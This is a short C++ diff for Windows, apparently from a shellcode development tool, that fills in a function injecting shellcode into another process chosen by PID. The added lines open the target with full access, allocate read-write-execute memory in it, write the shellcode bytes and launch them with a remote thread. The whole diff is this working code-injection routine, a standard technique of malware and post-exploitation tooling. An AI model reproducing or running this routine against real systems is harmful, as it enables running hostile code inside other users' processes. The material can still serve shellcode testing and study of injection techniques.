@@ -17,5 +17,15 @@ BOOL shelldev_inject_shellcode(std::vector<asm_t>* assemblies, std::string pid)
 
 	std::vector<unsigned char> bytes = get_shellcode(assemblies);
 
+	HANDLE processHandle;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)std::atoi(pid.c_str()));
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, bytes.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(processHandle, remoteBuffer, bytes.data(), bytes.size(), NULL);
+	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	CloseHandle(processHandle);
+
 	return TRUE;
 }
